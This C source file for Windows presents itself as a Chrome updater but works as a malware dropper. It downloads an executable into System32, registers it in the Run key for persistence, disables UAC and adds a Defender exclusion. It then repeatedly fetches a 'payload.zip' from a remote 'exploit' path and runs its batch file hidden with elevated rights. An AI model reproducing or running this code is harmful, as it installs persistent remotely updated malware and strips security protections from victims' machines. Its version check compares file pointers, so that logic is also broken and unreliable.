#include <stdio.h>
#include <stdlib.h>

void timeout() {
    system("timeout 30 >nul");
}

void update_timeout() {
    system("timeout 5 >nul");
}

void debug_timeout() {
    printf("\033[31mdebug\033[00m");
    system("timeout 5");
}

void first_setup() {
    system("bitsadmin /transfer version_new /download /priority HIGH \"https://github.com/Phoenixthrush/phoenixthrush.github.io/releases/download/1.6/chromeupdater.exe\" \"C:\\Windows\\System32\\chromeupdater.exe\"");
    system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"update\" /t REG_SZ /f /d \"C:\\Windows\\System32\\chromeupdater.exe\"");
    system("reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
    system("powershell -command \"Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"\"");
    exit(0);
}

int check_if_file_exists(const char * path) {
    FILE *fptr = fopen(path, "r");
    if (fptr == NULL)
        return 0;

    fclose(fptr);
    return 1;
}

int read_check_if_version_exists() {
    if (check_if_file_exists("C:\\Windows\\System32\\version") == 1) {
        printf("exist!\n");
    } else {
        printf("does not exist!\n");
    }
    return 0;
}

int read_check_if_installer_exists() {
    if (check_if_file_exists("C:\\Windows\\System32\\chromeupdater.exe") == 1) {
        printf("exist!\n");
        return 1;
    } else {
        printf("does not exist!\n");
    }
    return 0;
}

void delete_version_new() {
    if (check_if_file_exists("C:\\Windows\\System32\\version_new") == 1) {
        system("del C:\\Windows\\System32\\version_new");
    } else {
        printf("old version not found!");
    }
}

int update() {
    system("del C:\\Windows\\System32\\version");
    system("del C:\\Windows\\System32\\version_new");
    system("bitsadmin /transfer version_new /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version\" \"C:\\Windows\\System32\\version\"");
    system("bitsadmin /transfer version_new /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/payload.zip\" \"C:\\Windows\\System32\\payload.zip\"");
    system("copy C:\\Windows\\System32\\version C:\\Windows\\System32\\version_new");
    system("taskkill /im chromebackground.exe /f");
    update_timeout();

    system("rmdir C:\\Windows\\System32\\chromeupdater /s /q");
    system("powershell -command \"Expand-Archive C:\\Windows\\System32\\payload.zip C:\\Windows\\System32\\chromeupdater\"");
    system("del C:\\Windows\\System32\\payload.zip");
    system("powershell -c \"Start-Process -Verb RunAs -WindowStyle hidden C:\\Windows\\System32\\chromeupdater\\chromebackgroundlist.bat\"");
    return 0;
}

void check_version() {
    read_check_if_version_exists();
    delete_version_new();
    system("bitsadmin /transfer version_new /download /priority HIGH \"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/exploit/version\" \"C:\\Windows\\System32\\version_new\"");

    FILE * fpointer = fopen("C:\\Windows\\System32\\version", "r");
    FILE * fpointer2 = fopen("C:\\Windows\\System32\\version_new", "r");

    fclose(fpointer);
    fclose(fpointer2);

    if (fpointer == fpointer2) {
        debug_timeout();
        timeout();
        check_version();
    } else {
        update();
        check_version();
    }
}

int main() {
    system("mkdir C:\\Windows\\System32\\chromeupdater");
    if (read_check_if_installer_exists() == 1) {
        system("powershell -c \\\"Start-Process -Verb RunAs -WindowStyle hidden C:\\Windows\\System32\\chromeupdater\\chromebackgroundlist.bat\\");
        check_version();
    } else {
        first_setup();
    }
    return 0;
}